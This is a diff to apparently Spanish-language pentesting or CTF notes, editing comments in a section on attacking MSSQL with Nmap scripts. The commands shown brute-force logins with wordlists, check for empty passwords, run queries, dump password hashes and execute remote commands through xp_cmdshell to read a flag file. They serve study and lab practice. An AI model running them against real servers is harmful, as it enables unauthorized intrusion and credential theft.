@@ -232,12 +232,12 @@ También hay puertos por UDP que pertenecen al Samba como 137,138
 
 ❯ nmap ❮Target IP❯ -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433   # Nos muestra la informacion de la DB
 
-# Hacemos fuerza bruta para buscar usuarios y passwds
+# Hacemos fuerza bruta para enumerar usuarios y passwds
 ❯ nmap ❮Target IP❯ -p 1433 --script ms-sql-brute --script-args userdb=/root/Descktop/wordlists/common_users.txt,passdb=/root/Desktop/wordlists/100-common-passwords.txt
 
-❯ nmap ❮Target IP❯ -p 1433 --script ms-sql-empty-password     # Nos muestra los usuarios que se pueden loggear sin password 'anonymous login'
+❯ nmap ❮Target IP❯ -p 1433 --script ms-sql-empty-password     # Nos muestra los usuarios que se pueden loggear sin password 'anonymous login' o 'sa user'
 
-# Colocamos un usuario y su passwd valida, y asi podremos usar una query para que nos muestre 
+# Colocamos un usuario y su passwd valida, y asi podremos usar una query para qextraer los 'sysusers'
 ❯ nmap ❮Target IP❯ -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=<password>,ms-sql-query.query="SELECT * FROM <db>.<tablename>" -oN out.txt
 
 	# out.txt = Formato de salida del escaneo de Nmap 
@@ -245,7 +245,7 @@ También hay puertos por UDP que pertenecen al Samba como 137,138
 ❯ nmap ❮Target IP❯ -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=<passwd> # Nos muestra los hashes
 
 ❯ nmap ❮Target IP❯ -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=<passwd>,ms-sql-xp-cmdshell.cmd="ipconfig" # Podemos ejecutar comandos de forma remota usando la base de datos
-	# Podemos usar mas comandos como: 'type C:\flag.txt'
+	# Podemos usar mas comandos como: 'type C:\flag.txt' y nos mostrara el contenido de la flag por consola
 ```
 
 ## LDAP
